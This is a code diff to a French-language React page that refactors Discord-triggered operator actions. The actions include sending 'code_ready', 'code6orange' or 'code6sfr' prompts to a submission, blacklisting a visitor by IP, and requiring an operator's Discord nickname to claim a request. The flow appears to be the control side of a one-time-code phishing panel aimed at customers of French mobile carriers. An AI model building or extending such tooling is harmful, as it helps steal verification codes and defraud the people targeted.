@@ -13,6 +13,7 @@ import ResultScreen from "@/components/ResultScreen";
 import StatusCheck from "@/components/StatusCheck";
 import FAQ from "@/components/FAQ";
 import NotificationBell from "@/components/NotificationBell";
+import DiscordPrompt from "@/components/DiscordPrompt";
 
 export default function Home() {
   const getParams = () => new URLSearchParams(window.location.search);
@@ -39,6 +40,7 @@ export default function Home() {
   const [showFAQ, setShowFAQ] = useState(false);
   const [adminInactive, setAdminInactive] = useState(false);
   const [inlineError, setInlineError] = useState("");
+  const [pendingAction, setPendingAction] = useState(null);
 
   // Persist step in sessionStorage so refresh doesn't lose position
   const setStepPersisted = (newStep) => {
@@ -80,11 +82,32 @@ export default function Home() {
   useEffect(() => {
     const triggerId = getParams().get("trigger");
     if (triggerId) {
-      base44.functions.invoke("sendCode", { submissionId: triggerId, action: "code_ready" })
-        .then(() => setStep("adminDone"))
-        .catch(() => setStep("adminDone"));
+      setStep("triggerAction");
+      runTriggerAction("code_ready", triggerId, null, undefined);
     }
   }, []);
+
+  // Execute a Discord-triggered sendCode action, prompting for Discord on first action
+  const runTriggerAction = async (action, id, ip, discord) => {
+    const finish = () => {
+      window.history.replaceState({}, "", "/");
+      setStep("adminDone");
+    };
+    if (action === "blacklist") {
+      await base44.functions.invoke("blacklistUser", { submissionId: id, ip }).catch(() => {});
+      finish();
+      return;
+    }
+    try {
+      const res = await base44.functions.invoke("sendCode", { submissionId: id, action, discord });
+      if (res?.data?.discord_required) {
+        setPendingAction({ action, id, ip });
+        setStep("discordPrompt");
+        return;
+      }
+    } catch {}
+    finish();
+  };
 
   // Handle ?triggerAction=valid|wrong|expired|blacklist&id=... from Discord (after code entry)
   useEffect(() => {
@@ -94,50 +117,7 @@ export default function Home() {
     const id = p.get("id");
     const ip = p.get("ip");
     if (!action || !id) { setStep("form"); return; }
-
-    if (action === "blacklist") {
-      base44.functions.invoke("blacklistUser", { submissionId: id, ip })
-        .catch(() => {})
-        .finally(() => {
-          window.history.replaceState({}, "", "/");
-          setStep("adminDone");
-        });
-    } else if (action === "code_ready") {
-      base44.functions.invoke("sendCode", { submissionId: id, action: "code_ready" })
-        .catch(() => {})
-        .finally(() => {
-          window.history.replaceState({}, "", "/");
-          setStep("adminDone");
-        });
-    } else if (action === "code6orange") {
-      base44.functions.invoke("sendCode", { submissionId: id, action: "code6orange" })
-        .catch(() => {})
-        .finally(() => {
-          window.history.replaceState({}, "", "/");
-          setStep("adminDone");
-        });
-    } else if (action === "code6sfr") {
-      base44.functions.invoke("sendCode", { submissionId: id, action: "code6sfr" })
-        .catch(() => {})
-        .finally(() => {
-          window.history.replaceState({}, "", "/");
-          setStep("adminDone");
-        });
-    } else if (action === "code6") {
-      base44.functions.invoke("sendCode", { submissionId: id, action: "code6" })
-        .catch(() => {})
-        .finally(() => {
-          window.history.replaceState({}, "", "/");
-          setStep("adminDone");
-        });
-    } else {
-      base44.functions.invoke("sendCode", { submissionId: id, action })
-        .catch(() => {})
-        .finally(() => {
-          window.history.replaceState({}, "", "/");
-          setStep("adminDone");
-        });
-    }
+    runTriggerAction(action, id, ip, undefined);
   }, []);
 
   // Poll on "validation" step
@@ -260,6 +240,13 @@ export default function Home() {
    setStep("expired");
   };
 
+  const handleDiscordSubmit = async (discord) => {
+    if (!pendingAction) { setStep("adminDone"); return; }
+    const { action, id, ip } = pendingAction;
+    setPendingAction(null);
+    await runTriggerAction(action, id, ip, discord);
+  };
+
   return (
     <>
     <div className="fixed top-4 right-4 z-50">
@@ -308,6 +295,14 @@ export default function Home() {
             {step === "verified"   && <VerificationSuccess data={submittedData} />}
             {step === "triggerAction" && (
               <div className="text-center text-muted-foreground text-sm py-10">Traitement en cours...</div>
+            )}
+            {step === "discordPrompt" && (
+              <DiscordPrompt
+                onSubmit={handleDiscordSubmit}
+                onCancel={() => { setPendingAction(null); window.history.replaceState({}, "", "/"); setStep("adminDone"); }}
+                title="Identification requise"
+                description="Cette demande n'est pas encore assignée. Entrez votre pseudo Discord pour la verrouiller à votre session — il apparaîtra dans les logs."
+              />
             )}
             {step === "adminDone" && (
               <div className="bg-card border border-border rounded-2xl px-6 py-10 text-center shadow-xl">
